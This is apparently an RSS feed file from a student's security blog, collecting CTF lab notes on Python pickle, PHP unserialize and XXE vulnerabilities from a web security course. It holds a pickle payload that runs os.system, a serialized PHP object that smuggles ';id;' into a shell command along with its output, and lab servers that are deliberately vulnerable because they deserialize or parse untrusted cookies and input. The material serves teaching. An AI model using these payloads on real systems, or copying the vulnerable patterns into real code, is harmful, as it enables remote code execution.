@@ -1,0 +1,322 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SBK Hugo Site</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/</link><description>Recent content on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/index.xml" rel="self" type="application/rss+xml"/><item><title>Simple Web 0x15.5(Pickle)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/</guid><description>&lt;h1 id="simple-web-0x155pickle">
+ Simple Web 0x15.5(Pickle)
+ &lt;a class="anchor" href="#simple-web-0x155pickle">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;h2 id="background---pickle">
+ Background - Pickle
+ &lt;a class="anchor" href="#background---pickle">#&lt;/a>
+&lt;/h2>
+&lt;p>Python magic method: &lt;code>__reduce__&lt;/code>
+&lt;code>__recude__&lt;/code> is used to define what needs to be done when deserializing.
+&lt;a href="https://youtu.be/73uI7BK8k3g?t=236">Web Hacking | 終章【EDU-CTF 2021】&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler &lt;code>exploit.py&lt;/code>&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-python!=" data-lang="python!=">import pickle
+import os
+import pickletools
+
+class exploit(object):
+ def __reduce__(self):
+ return (os.system, (&amp;#39;pwd&amp;#39;,))
+ 
+
+serialized = pickle.dumps(exploit())
+print(bytes.hex(serialized))
+optim_s = pickletools.optimize(serialized)
+print(pickletools.dis(serialized))
+print(pickletools.dis(optim_s))
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
+&lt;hr>
+&lt;p>:::spoiler server_app.py&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import pickle
+
+serialized = bytes.fromhex(input(&amp;#39;Data: &amp;#39;))
+pickle.loads(serialized)
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x16.5(php unserialize)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/</guid><description>&lt;h1 id="simple-web-0x165php-unserialize">
+ Simple Web 0x16.5(php unserialize)
+ &lt;a class="anchor" href="#simple-web-0x165php-unserialize">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>php magic method
+&lt;img src="https://i.imgur.com/xQrh7vo.png" alt="" />&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">class cat
+{
+ public $sound = &amp;#39;ls&amp;#39;;
+ function __wakeup()
+ {
+ system(&amp;#34;echo&amp;#34;.$this-&amp;gt;sound);
+ }
+}
+$cat = unserialize($_GET[&amp;#39;cat&amp;#39;]);
+&lt;/code>&lt;/pre>&lt;h2 id="description--analyze">
+ Description &amp;amp; Analyze
+ &lt;a class="anchor" href="#description--analyze">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ php -a
+php &amp;gt; class cat
+php &amp;gt; public {
+php { public $sound = &amp;#39;ls&amp;#39;;
+php { function __wakeup()
+php { {
+php { system(&amp;#34;echo &amp;#34;.$this-&amp;gt;sound);
+php { }
+php { }
+php &amp;gt; $_GET[&amp;#39;cat&amp;#39;]=&amp;#39;O:3:&amp;#34;cat&amp;#34;:1:{s:5:&amp;#34;sound&amp;#34;;s:4:&amp;#34;meow&amp;#34;;}&amp;#39;;
+php &amp;gt; $cat = unserialize($_GET[&amp;#39;cat&amp;#39;]);
+meow
+php &amp;gt; $_GET[&amp;#39;cat&amp;#39;]=&amp;#39;O:3:&amp;#34;cat&amp;#34;:1:{s:5:&amp;#34;sound&amp;#34;;s:4:&amp;#34;;id;&amp;#34;;}&amp;#39;;
+php &amp;gt; $cat = unserialize($_GET[&amp;#39;cat&amp;#39;]);
+
+uid=1000(sbk6401) gid=1000(sbk6401) groups=1000(sbk6401),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)
+&lt;/code>&lt;/pre>&lt;p>This is a typical command injection. The magic method &lt;code>__wakeup()&lt;/code> will be called when unserialized something.&lt;/p></description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/</guid><description>&lt;h1 id="simple-web-0x16lab---pickle">
+ Simple Web 0x16(Lab - Pickle)
+ &lt;a class="anchor" href="#simple-web-0x16lab---pickle">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8600/">http://h4ck3r.quest:8600/&lt;/a>
+Note: open a brand new window that haven&amp;rsquo;t login &lt;code>http://h4ck3r.quest&lt;/code>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://bernie6401.github.io/IcoQql7UQiegLv8KtK2wOw">0x15.5(Pickle)&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-pyton=" data-lang="pyton=">from flask import Flask, request, make_response, redirect, send_file
+import base64
+import pickle
+
+app = Flask(__name__)
+
+
+@app.route(&amp;#34;/sauce&amp;#34;)
+def sauce():
+ return send_file(__file__, mimetype=&amp;#34;text/plain&amp;#34;)
+
+
+@app.route(&amp;#34;/&amp;#34;)
+def main():
+ session = request.cookies.get(&amp;#34;session&amp;#34;)
+ if session == None:
+ return &amp;#39;&amp;lt;form action=&amp;#34;/login&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;&amp;#39; +\
+ &amp;#39;&amp;lt;p&amp;gt;Name: &amp;lt;input name=&amp;#34;name&amp;#34; type=&amp;#34;text&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
+ &amp;#39;&amp;lt;p&amp;gt;Age: &amp;lt;input name=&amp;#34;age&amp;#34; type=&amp;#34;number&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
+ &amp;#39;&amp;lt;button&amp;gt;Submit&amp;lt;/button&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;a href=&amp;#34;/sauce&amp;#34;&amp;gt;Source code&amp;lt;/a&amp;gt;&amp;#39;
+
+ else:
+ user = pickle.loads(base64.b64decode(session))
+ return f&amp;#39;&amp;lt;p&amp;gt;Name: {user[&amp;#34;name&amp;#34;]}&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Age: {user[&amp;#34;age&amp;#34;]}&amp;lt;/p&amp;gt;&amp;#39;
+
+
+@app.route(&amp;#34;/login&amp;#34;, methods=[&amp;#39;POST&amp;#39;])
+def login():
+ user = base64.b64encode(pickle.dumps({
+ &amp;#34;name&amp;#34;: request.form.get(&amp;#39;name&amp;#39;),
+ &amp;#34;age&amp;#34;: int(request.form.get(&amp;#39;age&amp;#39;))
+ }))
+ resp = make_response(redirect(&amp;#39;/&amp;#39;))
+ resp.set_cookie(&amp;#34;session&amp;#34;, user)
+ return resp
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/</guid><description>&lt;h1 id="simple-web-0x17lab---baby-cat">
+ Simple Web 0x17(Lab - Baby Cat)
+ &lt;a class="anchor" href="#simple-web-0x17lab---baby-cat">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8601/">http://h4ck3r.quest:8601/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://bernie6401.github.io/FkF8p-zrSMSOWFkE4vvAJQ">0x16.5(php unserialize)&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
+isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));
+
+class Cat
+{
+ public $name = &amp;#39;(guest cat)&amp;#39;;
+ function __construct($name)
+ {
+ $this-&amp;gt;name = $name;
+ }
+ function __wakeup()
+ {
+ echo &amp;#34;&amp;lt;pre&amp;gt;&amp;#34;;
+ system(&amp;#34;cowsay &amp;#39;Welcome back, $this-&amp;gt;name&amp;#39;&amp;#34;);
+ echo &amp;#34;&amp;lt;/pre&amp;gt;&amp;#34;;
+ }
+}
+
+if (!isset($_COOKIE[&amp;#39;cat_session&amp;#39;])) {
+ $cat = new Cat(&amp;#34;cat_&amp;#34; . rand(0, 0xffff));
+ setcookie(&amp;#39;cat_session&amp;#39;, base64_encode(serialize($cat)));
+} else {
+ $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat_session&amp;#39;]));
+}
+?&amp;gt;
+&amp;lt;p&amp;gt;Hello, &amp;lt;?= $cat-&amp;gt;name ?&amp;gt;.&amp;lt;/p&amp;gt;
+&amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;source code&amp;lt;/a&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/</guid><description>&lt;h1 id="simple-web-0x18lab---magic-cat">
+ Simple Web 0x18(Lab - Magic Cat)
+ &lt;a class="anchor" href="#simple-web-0x18lab---magic-cat">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8602/">http://h4ck3r.quest:8602/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>None&amp;hellip;&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-php=&lt;?php" data-lang="php=&lt;?php">isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));
+
+class Magic
+{
+ function cast($spell)
+ {
+ echo &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;MAGIC, $spell!&amp;#39;);&amp;lt;/script&amp;gt;&amp;#34;;
+ }
+}
+
+// Useless class?
+class Caster
+{
+ public $cast_func = &amp;#39;intval&amp;#39;;
+ function cast($val)
+ {
+ return ($this-&amp;gt;cast_func)($val);
+ }
+}
+
+
+class Cat
+{
+ public $magic;
+ public $spell;
+ function __construct($spell)
+ {
+ $this-&amp;gt;magic = new Magic();
+ $this-&amp;gt;spell = $spell;
+ }
+ function __wakeup()
+ {
+ echo &amp;#34;Cat Wakeup!\n&amp;#34;;
+ $this-&amp;gt;magic-&amp;gt;cast($this-&amp;gt;spell);
+ }
+}
+
+if (isset($_GET[&amp;#39;spell&amp;#39;])) {
+ $cat = new Cat($_GET[&amp;#39;spell&amp;#39;]);
+} else if (isset($_COOKIE[&amp;#39;cat&amp;#39;])) {
+ echo &amp;#34;Unserialize...\n&amp;#34;;
+ $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat&amp;#39;]));
+} else {
+ $cat = new Cat(&amp;#34;meow-meow-magic&amp;#34;);
+}
+?&amp;gt;
+&amp;lt;pre&amp;gt;
+This is your 🐱:
+&amp;lt;?php var_dump($cat) ?&amp;gt;
+&amp;lt;/pre&amp;gt;
+
+&amp;lt;p&amp;gt;Usage:&amp;lt;/p&amp;gt;
+&amp;lt;p&amp;gt;/?source&amp;lt;/p&amp;gt;
+&amp;lt;p&amp;gt;/?spell=the-spell-of-your-cat&amp;lt;/p&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/</guid><description>&lt;h1 id="simple-web-0x23lab---xxe">
+ Simple Web 0x23(Lab - XXE)
+ &lt;a class="anchor" href="#simple-web-0x23lab---xxe">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8604/">http://h4ck3r.quest:8604/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://www.w3schools.com/xml/xml_tree.asp">XML Tree&lt;/a>
+&lt;a href="https://www.w3schools.com/xml/xml_parser.asp">XML Parser&lt;/a>
+&lt;a href="https://www.w3schools.com/xml/ajax_xmlhttprequest_response.asp">AJAX - Server Response&lt;/a>
+&lt;a href="https://www.w3schools.com/xml/xml_dtd.asp">XML DTD&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://phper.shujuwajue.com/shu-zu/shu-ru-liu-php-input">输入流 php://input&lt;/a>&lt;/p>
+&lt;blockquote>
+&lt;p>php://input可以读取没有处理过的POST数据。&lt;/p>&lt;/blockquote>
+&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10217536">Day 18：Stream 概述&lt;/a>&lt;/p>
+&lt;blockquote>
+&lt;p>php://input
+取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。&lt;/p>&lt;/blockquote>
+&lt;p>&lt;a href="https://www.digicentre.com.tw/industry_detail?id=38">來自外部的威脅-XXE漏洞攻擊成因&lt;/a>
+:::spoiler XXE course lecture
+&lt;img src="https://i.imgur.com/NsyIcdt.png" alt="" />&lt;/p>
+&lt;p>&lt;img src="https://i.imgur.com/zYonfqc.png" alt="" />
+:::
+:::spoiler exploit type
+&lt;img src="https://i.imgur.com/IJlFonF.png" alt="" />&lt;/p>
+&lt;p>&lt;img src="https://i.imgur.com/N9VNyBC.png" alt="" />&lt;/p>
+&lt;p>&lt;img src="https://i.imgur.com/uqPwH5H.png" alt="" />&lt;/p>
+&lt;p>&lt;img src="https://i.imgur.com/j8WI9eQ.png" alt="" />
+:::&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
+ $xmlfile = urldecode(file_get_contents(&amp;#39;php://input&amp;#39;));
+ if (!$xmlfile) die(show_source(__FILE__));
+
+ $dom = new DOMDocument();
+ $dom-&amp;gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+ $creds = simplexml_import_dom($dom);
+ $user = $creds-&amp;gt;user;
+ echo &amp;#34;You have logged in as user $user&amp;#34;;
+?&amp;gt;
+&lt;/code>&lt;/pre>&lt;h2 id="exploit---xxe">
+ Exploit - XXE
+ &lt;a class="anchor" href="#exploit---xxe">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>Normal Usage in this webpage&lt;/li>
+&lt;/ol>
+&lt;h2 id="reference">
+ Reference
+ &lt;a class="anchor" href="#reference">#&lt;/a>
+&lt;/h2></description></item></channel></rss>
